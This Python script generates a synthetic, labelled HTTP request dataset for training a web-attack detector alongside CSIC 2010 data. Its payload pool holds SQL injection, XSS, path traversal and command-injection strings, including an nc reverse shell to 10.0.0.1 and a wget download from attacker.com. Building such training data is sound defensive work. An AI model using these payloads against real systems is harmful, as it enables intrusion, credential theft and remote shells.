"""
Generate a labelled synthetic HTTP request dataset that augments the real CSIC
2010 data.

Why this exists:
  * CSIC 2010 is binary (Normal/Anomalous) and its attacks are subtle / URL
    encoded. A model trained only on CSIC may not reliably flag obvious textbook
    payloads (e.g. `' OR 1=1 --`, `<script>alert(1)</script>`).
  * This synthetic set provides clearly-labelled, varied SQLi / XSS / path
    traversal / command-injection requests so the model generalises to those
    textbook attacks. This makes the live demo convincing while the real CSIC
    data keeps the result honest (see data/README.md and docs/dataset.md).

The schema matches the parsed CSIC frame: label, method, path, query, body.
An extra `attack_type` column is produced for transparency / possible multiclass
use but is NOT used as a model input (it would leak the label). When combining
with CSIC for binary training, `attack_type` is dropped.

Usage:
    python -m training.synthetic            # prints a small sample + counts
    python -m training.synthetic --out data/synthetic_http.csv
"""
from __future__ import annotations

import argparse
import os
import random
import sys

import pandas as pd

# ---------------------------------------------------------------- pools
NORMAL_ENDPOINTS = [
    "/api/products", "/api/users", "/api/orders", "/api/items", "/api/search",
    "/api/cart", "/api/profile", "/api/reviews", "/api/categories", "/api/login",
    "/api/register", "/api/checkout", "/api/feedback", "/api/notifications",
    "/api/dashboard", "/api/sessions", "/api/payments", "/health", "/api/version",
    "/api/config", "/api/products/{id}", "/api/users/{id}", "/api/orders/{id}",
    "/api/items/{id}", "/api/reviews/{id}",
]

PARAM_NAMES = [
    "id", "user", "name", "q", "category", "page", "limit", "sort", "filter",
    "type", "value", "search", "token", "session", "item", "product", "order",
    "email", "username", "password", "qty", "price", "status", "format", "lang",
]

NORMAL_WORDS = [
    "laptop", "phone", "book", "coffee", "chair", "lamp", "monitor", "keyboard",
    "mouse", "desk", "notebook", "pen", "bottle", "bag", "watch", "headphones",
    "tablet", "charger", "cable", "camera", "speaker", "shoes", "jacket", "hat",
    "alice", "bob", "carol", "dave", "eve", "frank", "grace", "heidi",
]

# Attack payload pools. Each entry is (payload, attack_type).
ATTACK_PAYLOADS = [
    # ---- SQL injection ----
    ("' OR '1'='1", "sqli"),
    ("' OR 1=1 --", "sqli"),
    ("' OR 1=1#", "sqli"),
    ("'; DROP TABLE users; --", "sqli"),
    ("1' UNION SELECT username,password FROM users --", "sqli"),
    ("admin'--", "sqli"),
    ("1; DELETE FROM orders WHERE 1=1", "sqli"),
    ("' OR ''='", "sqli"),
    ("') OR ('1'='1", "sqli"),
    ("' AND 1=CONVERT(int,@@version)--", "sqli"),
    ("1' AND SLEEP(5)--", "sqli"),
    ("'; WAITFOR DELAY '0:0:5'--", "sqli"),
    ("1' UNION SELECT card_no FROM cards--", "sqli"),
    ("' OR 1=1 LIMIT 1 --", "sqli"),
    ("0x27 OR 1=1 --", "sqli"),
    # ---- XSS ----
    ("<script>alert(1)</script>", "xss"),
    ("<script>alert('xss')</script>", "xss"),
    ("<img src=x onerror=alert(1)>", "xss"),
    ("\"><svg onload=alert(1)>", "xss"),
    ("javascript:alert(1)", "xss"),
    ("<body onload=alert(1)>", "xss"),
    ("<iframe src=javascript:alert(1)></iframe>", "xss"),
    ("'><script>document.cookie</script>", "xss"),
    ("<scr<script>ipt>alert(1)</script>", "xss"),
    ("onmouseover=alert(1)", "xss"),
    ("<svg><script>alert(1)</script></svg>", "xss"),
    ("<details open ontoggle=alert(1)>", "xss"),
    # ---- Path traversal ----
    ("../../../etc/passwd", "path_traversal"),
    ("..\\..\\..\\windows\\win.ini", "path_traversal"),
    ("....//....//etc/passwd", "path_traversal"),
    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path_traversal"),
    ("..%252f..%252fetc%252fpasswd", "path_traversal"),
    ("../../../../var/log/auth.log", "path_traversal"),
    ("..%c0%af..%c0%af../etc/passwd", "path_traversal"),
    ("C:\\windows\\win.ini", "path_traversal"),
    ("....\\....\\boot.ini", "path_traversal"),
    ("/etc/shadow", "path_traversal"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "path_traversal"),
    # ---- Command injection ----
    ("; ls -la", "cmd_injection"),
    ("| cat /etc/passwd", "cmd_injection"),
    ("& whoami", "cmd_injection"),
    ("$(id)", "cmd_injection"),
    ("`uname -a`", "cmd_injection"),
    ("; ping -c 4 attacker.com", "cmd_injection"),
    ("| nc -e /bin/sh 10.0.0.1 4444", "cmd_injection"),
    ("&& dir", "cmd_injection"),
    ("; cat /etc/shadow", "cmd_injection"),
    ("| wget http://attacker.com/sh -O /tmp/sh", "cmd_injection"),
]

HTTP_METHODS = ["GET", "POST", "GET", "GET", "PUT"]  # GET weighted heavier


def _rand_int(rng): return rng.randint(1, 9999)


def _rand_word(rng): return rng.choice(NORMAL_WORDS)


def _encode_maybe(text: str, rng) -> str:
    """Sometimes URL-encode the payload (both forms appear in real traffic)."""
    if rng.random() < 0.4:
        from urllib.parse import quote
        return quote(text, safe="")
    return text


def _endpoint(rng) -> str:
    ep = rng.choice(NORMAL_ENDPOINTS)
    if "{id}" in ep:
        return ep.replace("{id}", str(_rand_int(rng)))
    return ep


def _normal_params(rng, n: int) -> list[tuple[str, str]]:
    out = []
    names = rng.sample(PARAM_NAMES, k=min(n, len(PARAM_NAMES)))
    for nm in names:
        if nm in ("page", "limit"):
            val = str(rng.randint(1, 100))
        elif nm in ("sort",):
            val = rng.choice(["asc", "desc", "price", "name"])
        elif nm in ("category", "type", "format", "lang", "status"):
            val = rng.choice(NORMAL_WORDS)
        elif nm in ("q", "search"):
            val = rng.choice(NORMAL_WORDS)
        elif nm in ("id", "user", "item", "product", "order"):
            val = str(_rand_int(rng))
        elif nm == "email":
            val = f"{_rand_word(rng)}@example.com"
        elif nm == "price":
            val = f"{rng.uniform(1, 999):.2f}"
        elif nm == "qty":
            val = str(rng.randint(1, 50))
        else:
            val = _rand_word(rng) + str(rng.randint(1, 99))
        out.append((nm, val))
    return out


def _params_to_query(params) -> str:
    return "&".join(f"{k}={v}" for k, v in params)


def _params_to_body(params) -> str:
    return "&".join(f"{k}={v}" for k, v in params)


def _make_normal(rng) -> dict:
    method = rng.choice(HTTP_METHODS)
    path = _endpoint(rng)
    n_params = rng.randint(0, 4)
    params = _normal_params(rng, n_params)
    query = ""
    body = ""
    if method == "GET":
        query = _params_to_query(params) if params else ""
    else:
        # POST/PUT: put params in body, sometimes also a short query
        body = _params_to_body(params) if params else ""
        if rng.random() < 0.3 and params:
            query = _params_to_query(params[:1])
    return {"label": 0, "method": method, "path": path, "query": query,
            "body": body, "attack_type": "normal"}


def _make_attack(rng) -> dict:
    payload, atype = rng.choice(ATTACK_PAYLOADS)
    payload = _encode_maybe(payload, rng)
    method = rng.choice(HTTP_METHODS)
    path = _endpoint(rng)

    # Build surrounding normal params, then inject the payload into one of them.
    n_normal = rng.randint(0, 3)
    params = _normal_params(rng, n_normal)
    inject_name = rng.choice(PARAM_NAMES)
    # Avoid overwriting; ensure injection param present
    if not any(p[0] == inject_name for p in params):
        params.append((inject_name, _rand_word(rng)))
    # inject payload as the value of the chosen param
    injected = False
    new_params = []
    for k, v in params:
        if k == inject_name and not injected:
            new_params.append((k, payload))
            injected = True
        else:
            new_params.append((k, v))
    if not injected:
        new_params.append((inject_name, payload))

    query = ""
    body = ""
    if method == "GET":
        # mostly in query, sometimes also reflected in a body-less request
        query = _params_to_query(new_params)
    else:
        # inject in body for POST/PUT, sometimes also in query
        body = _params_to_query(new_params)
        if rng.random() < 0.3:
            query = _params_to_query(new_params[:1])
    # Occasionally append the payload directly to the path (path traversal style)
    if atype == "path_traversal" and rng.random() < 0.5:
        path = path.rstrip("/") + "/" + payload
        query = ""
        body = ""
    return {"label": 1, "method": method, "path": path, "query": query,
            "body": body, "attack_type": atype}


def generate_synthetic_dataset(
    n_normal: int = 3000,
    n_attack: int = 6000,
    seed: int = 42,
) -> pd.DataFrame:
    """Generate a labelled synthetic HTTP request DataFrame."""
    rng = random.Random(seed)
    rows = [_make_normal(rng) for _ in range(n_normal)]
    rows += [_make_attack(rng) for _ in range(n_attack)]
    rng.shuffle(rows)
    df = pd.DataFrame(rows, columns=["label", "method", "path", "query", "body", "attack_type"])
    df["label"] = df["label"].astype(int)
    return df


def main(argv=None) -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic HTTP requests")
    parser.add_argument("--out", default=None, help="Optional output CSV path")
    parser.add_argument("--normal", type=int, default=3000)
    parser.add_argument("--attack", type=int, default=6000)
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args(argv)

    df = generate_synthetic_dataset(args.normal, args.attack, args.seed)
    print(f"Generated {len(df)} synthetic requests")
    print("Label counts:", df["label"].value_counts().to_dict())
    print("Attack-type counts:")
    print(df["attack_type"].value_counts().to_string())
    print("\nSamples:")
    print(df.head(8).to_string())

    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)) or ".", exist_ok=True)
        df.to_csv(args.out, index=False)
        print(f"\nWrote {args.out}")


if __name__ == "__main__":
    main()
